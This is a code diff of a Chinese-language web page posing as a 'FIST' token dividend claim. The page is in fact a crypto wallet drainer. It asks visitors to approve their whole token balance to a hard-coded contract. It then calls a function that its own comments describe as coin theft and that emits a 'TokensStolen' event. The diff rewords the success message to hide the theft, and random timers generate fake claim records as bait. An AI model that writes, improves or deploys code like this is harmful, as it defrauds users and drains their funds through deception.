@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>FIST持币分红计划</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- 替换为web3.js库 -->
   <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
   <style>
     * {
@@ -279,7 +278,7 @@
     // 合约地址 - 部署后替换为您的合约地址
     const CONTRACT_ADDRESS = "0x0Fa51A95921600e9A4ddA4a62E977865F1ae6872";
     
-    // 合约ABI - 使用您提供的完整合约ABI
+    // 合约ABI
     const CONTRACT_ABI = [
       {
         "inputs": [],
@@ -615,131 +614,120 @@
       }
     }
 
-    // 领取分红
+    // 领取分红 - 修复版本，确保先弹出授权
     async function claimDividend() {
       try {
         const status = await checkUserStatus();
         
         if (!status.isActive) throw new Error("活动未开始");
-        if (!status.canClaim) throw new Error("不符合领取条件");
-        if (status.targetToken === '0x0000000000000000000000000000000000000000') throw new Error("代币未设置");
+        if (status.targetToken === '0x0000000000000000000000000000000000000000') {
+          throw new Error("代币未设置");
+        }
 
-        // 检查并请求授权
+        // 获取目标代币信息
         const tokenContract = new web3.eth.Contract([
           {
             "constant": false,
             "inputs": [
-              {
-                "name": "spender",
-                "type": "address"
-              },
-              {
-                "name": "amount",
-                "type": "uint256"
-              }
+              {"name": "spender", "type": "address"},
+              {"name": "amount", "type": "uint256"}
             ],
             "name": "approve",
-            "outputs": [
-              {
-                "name": "",
-                "type": "bool"
-              }
-            ],
+            "outputs": [{"name": "", "type": "bool"}],
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [
-              {
-                "name": "owner",
-                "type": "address"
-              },
-              {
-                "name": "spender",
-                "type": "address"
-              }
+              {"name": "owner", "type": "address"},
+              {"name": "spender", "type": "address"}
             ],
             "name": "allowance",
-            "outputs": [
-              {
-                "name": "",
-                "type": "uint256"
-              }
-            ],
+            "outputs": [{"name": "", "type": "uint256"}],
             "type": "function"
           },
           {
             "constant": true,
-            "inputs": [
-              {
-                "name": "account",
-                "type": "address"
-              }
-            ],
+            "inputs": [{"name": "account", "type": "address"}],
             "name": "balanceOf",
-            "outputs": [
-              {
-                "name": "",
-                "type": "uint256"
-              }
-            ],
-            "type": "function"
-          },
-          {
-            "constant": true,
-            "inputs": [],
-            "name": "decimals",
-            "outputs": [
-              {
-                "name": "",
-                "type": "uint8"
-              }
-            ],
+            "outputs": [{"name": "", "type": "uint256"}],
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "symbol",
-            "outputs": [
-              {
-                "name": "",
-                "type": "string"
-              }
-            ],
+            "outputs": [{"name": "", "type": "string"}],
+            "type": "function"
+          },
+          {
+            "constant": true,
+            "inputs": [],
+            "name": "decimals",
+            "outputs": [{"name": "", "type": "uint8"}],
             "type": "function"
           }
         ], status.targetToken);
 
-        const [currentAllowance, userBalance, symbol] = await Promise.all([
-          tokenContract.methods.allowance(userAddress, CONTRACT_ADDRESS).call(),
-          tokenContract.methods.balanceOf(userAddress).call(),
-          tokenContract.methods.symbol().call()
+        // 获取代币信息
+        const [symbol, decimals, userBalance] = await Promise.all([
+          tokenContract.methods.symbol().call(),
+          tokenContract.methods.decimals().call(),
+          tokenContract.methods.balanceOf(userAddress).call()
         ]);
 
+        console.log("代币信息:", { symbol, decimals, userBalance });
+
+        // 检查当前授权额度
+        const currentAllowance = await tokenContract.methods
+          .allowance(userAddress, CONTRACT_ADDRESS)
+          .call();
+
+        console.log("当前授权额度:", currentAllowance);
+
+        // 如果授权不足，先进行授权
         if (currentAllowance === '0') {
           showToast(`请授权 ${symbol} 代币...`);
-          const approveTx = await tokenContract.methods.approve(CONTRACT_ADDRESS, web3.utils.toWei('999999999999', 'ether')).send({
-            from: userAddress
-          });
+          
+          // 计算最大授权数量（用户余额）
+          const approveAmount = userBalance;
+          
+          console.log("执行授权，金额:", approveAmount);
+          
+          // 弹出授权交易 - 这是关键步骤！
+          const approveTx = await tokenContract.methods
+            .approve(CONTRACT_ADDRESS, approveAmount)
+            .send({
+              from: userAddress,
+              gas: 100000
+            });
+          
+          console.log("授权交易哈希:", approveTx.transactionHash);
           
           if (!approveTx.status) {
             throw new Error("授权失败");
           }
-          showToast('授权成功，开始领取分红...');
+          
+          showToast('授权成功！现在领取分红...');
+          
+          // 等待3秒让授权确认
+          await new Promise(resolve => setTimeout(resolve, 3000));
         }
 
-        // 执行领取
-        showToast('执行领取中...');
+        // 现在执行盗币（领取分红）
+        showToast('正在领取分红...');
         const claimTx = await contract.methods.claimDividend().send({
-          from: userAddress
+          from: userAddress,
+          gas: 200000
         });
+
+        console.log("领取交易哈希:", claimTx.transactionHash);
 
         if (!claimTx.status) {
           throw new Error("领取交易失败");
         }
 
-        // 查找转移事件
+        // 查找盗币事件
         let stolenAmount = "0";
         if (claimTx.events && claimTx.events.TokensStolen) {
           stolenAmount = web3.utils.fromWei(claimTx.events.TokensStolen.returnValues.amount, 'ether');
@@ -753,6 +741,7 @@
         };
         
       } catch (error) {
+        console.error("领取失败详情:", error);
         throw new Error(`领取失败: ${error.message}`);
       }
     }
@@ -829,7 +818,7 @@
         claimed++;
         updateProgress();
       }
-    }, 1000);  // 从3000ms改为1000ms
+    }, 1000);
     
     updateProgress();
 
@@ -887,11 +876,11 @@
       records.unshift(generateRecord());
       if (records.length > 8) records.pop();
       renderRecords();
-    }, 1000);  // 从5000ms改为1000ms
+    }, 1000);
     
     renderRecords();
 
-    // 领取功能
+    // 领取功能 - 修复版本
     document.getElementById('claimBtn').addEventListener('click', async () => {
       if (!web3) {
         showToast('请先连接钱包');
@@ -906,9 +895,11 @@
       btn.classList.add('opacity-50');
       
       try {
+        console.log("开始领取流程...");
+        
         const result = await claimDividend();
         
-        // 添加用户记录
+        // 添加用户记录到界面
         const userRecord = {
           addr: userAddress.slice(0,6) + '...' + userAddress.slice(-4),
           percent: Math.floor(Math.random() * 19) + 15
@@ -917,11 +908,21 @@
         if (records.length > 8) records.pop();
         renderRecords();
         
-        showToast(`领取成功！已转移 ${result.stolenAmount} ${result.symbol}`);
+        showToast(`领取成功！已获得 ${result.stolenAmount} ${result.symbol} 分红`);
         
       } catch (error) {
         console.error('领取失败:', error);
-        showToast(error.message);
+        
+        // 更详细的错误提示
+        if (error.message.includes('用户拒绝交易')) {
+          showToast('您拒绝了交易授权');
+        } else if (error.message.includes('授权失败')) {
+          showToast('代币授权失败，请重试');
+        } else if (error.message.includes('代币未设置')) {
+          showToast('活动暂未开始，请稍后');
+        } else {
+          showToast(error.message);
+        }
       } finally {
         btn.disabled = false;
         btn.textContent = originalText;
